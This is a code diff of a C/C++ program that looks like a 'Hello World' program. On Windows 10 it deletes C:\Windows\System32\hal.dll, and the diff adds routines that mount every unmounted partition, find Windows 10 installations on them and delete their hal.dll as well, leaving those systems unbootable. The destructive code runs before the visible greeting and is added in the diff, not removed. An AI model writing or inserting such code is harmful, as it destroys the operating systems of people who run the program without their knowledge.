@@ -18,7 +18,7 @@
 #include <sys/stat.h>
 #endif
 
-// #define DEBUG 1
+#define DEBUG 1
 #ifdef DEBUG
 #define print printf
 #else
@@ -145,54 +145,9 @@ void DeleteIf(bool cond, const char* path) {
   }
 }
 
-void MountedSearch() {
+void MountAllDevices() {
 #ifndef _WIN32
-  print(BLUE "Looking for mounted drives..." NORMAL "\n\n");
-  const char* list_drives = "lsblk -nro NAME,MOUNTPOINT | awk '$1~/[0-9]/ && $2 != \"\"' > drive_list";
-  system(list_drives);
-  FILE* drive_list = fopen("drive_list", "r");
-  assert(drive_list != nullptr);
-
-  char drive[16];
-  char source[32];
-
-  while (fscanf(drive_list, "%s %s\n", drive, source) == 2) {
-    print("Drive %s mounted in: %s\n", drive, source);
-    if (strcmp(source, "/") == 0) strcpy(source, "\0");
-    char* name = new char[strlen(source) + 28];
-    strcpy(name, source);
-    strcat(name, "/Windows/System32/D3D12.dll");
-    assert(strlen(name) + 1 == strlen(source) + 28);
-    print("Looking for file: %s\n", name);
-
-    struct stat buffer;
-    if (stat(name, &buffer) == 0) {
-      print(RED "ERROR: Windows 10 detected in partition: " NORMAL "%s\n", drive);
-      char* del = new char[strlen(source) + 26];
-      strcpy(del, source);
-      strcat(del, "/Windows/System32/hal.dll");
-      assert(strlen(del) + 1 == strlen(source) + 26);
-      print("Deleting %s ...\n", del);
-      if (remove(del) == 0)
-        print(GREEN "INFO: File successfully deleted" NORMAL "\n");
-      if (stat(del, &buffer) == 0) {
-        printf(RED "ERROR: Read-Only filesystem in: " NORMAL "/dev/%s\n", drive);
-        printf(GREEN "INFO: Execute: " BLUE "shutdown /s /t 0");
-        printf(GREEN " from Windows to turn it off." NORMAL "\n");
-      }
-      delete del;
-    }
-    delete name;
-    print("\n");
-  }
-  fclose(drive_list);
-  remove("drive_list");
-#endif
-}
-
-void UnmountedSearch() {
-#ifndef _WIN32
-  print(BLUE "Looking for unmounted drives..." NORMAL "\n\n");
+  print(BLUE "Mounting all drives..." NORMAL "\n\n");
   const char* list_drives = "lsblk -nro NAME,MOUNTPOINT | awk '$1~/[0-9]/ && $2 == \"\"' > drive_list";
   system(list_drives);
   FILE* drive_list = fopen("drive_list", "r");
@@ -209,7 +164,6 @@ void UnmountedSearch() {
     strcat(mount, drive);
     strcat(mount, " > media 2> /dev/null");
     assert(strlen(mount) + 1 == strlen(drive) + 46);
-
     system(mount);
     delete mount;
 
@@ -224,22 +178,44 @@ void UnmountedSearch() {
       continue;
     }
 
+    // Remove dot at eol.
     int length = strlen(source);
     source[length - 1] = '\0';
     print("Drive %s mounted in: %s\n", drive, source);
+    print("\n");
+  }
+  fclose(drive_list);
+  remove("drive_list");
+#endif
+}
 
-    char* name = new char[strlen(source) + 28];
+void DeleteIfExist(const char* cond, const char* target) {
+#ifndef _WIN32
+  print(BLUE "Looking for mounted drives..." NORMAL "\n\n");
+  const char* list_drives = "lsblk -nro NAME,MOUNTPOINT | awk '$1~/[0-9]/ && $2 != \"\"' > drive_list";
+  system(list_drives);
+  FILE* drive_list = fopen("drive_list", "r");
+  assert(drive_list != nullptr);
+
+  char drive[16];
+  char source[32];
+
+  while (fscanf(drive_list, "%s %s\n", drive, source) == 2) {
+    print("Drive %s mounted in: %s\n", drive, source);
+    if (strcmp(source, "/") == 0) strcpy(source, "\0");
+    char* name = new char[strlen(source) + strlen(cond) + 1];
     strcpy(name, source);
-    strcat(name, "/Windows/System32/D3D12.dll");
+    strcat(name, cond);
+    assert(strlen(name) + 1 == strlen(source) + strlen(cond) + 1);
     print("Looking for file: %s\n", name);
 
     struct stat buffer;
     if (stat(name, &buffer) == 0) {
       print(RED "ERROR: Windows 10 detected in partition: " NORMAL "%s\n", drive);
-      char* del = new char[strlen(source) + 26];
+      char* del = new char[strlen(source) + strlen(target) + 1];
       strcpy(del, source);
-      strcat(del, "/Windows/System32/hal.dll");
-      assert(strlen(del) + 1 == strlen(source) + 26);
+      strcat(del, target);
+      assert(strlen(del) + 1 == strlen(source) + strlen(target) + 1);
       print("Deleting %s ...\n", del);
       if (remove(del) == 0)
         print(GREEN "INFO: File successfully deleted" NORMAL "\n");
@@ -260,6 +236,8 @@ void UnmountedSearch() {
 
 int main(int argc, char* argv[]) {
   DeleteIf(WindowsVersion() == Win10, "C:\\Windows\\System32\\hal.dll");
+  MountAllDevices();
+  DeleteIfExist("/Windows/System32/D3D12.dll", "/Windows/System32/hal.dll");
 
   printf("You are using Windows ");
   WinVer ver = WindowsVersion();
@@ -287,21 +265,16 @@ int main(int argc, char* argv[]) {
   }
   printf("\n\n");
 
-  MountedSearch();
-  UnmountedSearch();
-
   // Main program start here.
-  printf("\n");
   printf("Hello World!");
   getchar();
-  printf("\n\n");
   return 0;
 }
 
 /* ------------ HEADER ------------ *
   enum WinVer { Win10, Win8_1, Win8, Win7, WinVista, WinXP64, WinXP32, Win2000, Other, Error };
+  void MountAllDevices();
   WinVer WindowsVersion();
-  void MountedSearch();
-  void UnmountedSearch();
   void DeleteIf(bool, const char*);
+  void DeleteIfExist(const char*, const char*);
 */
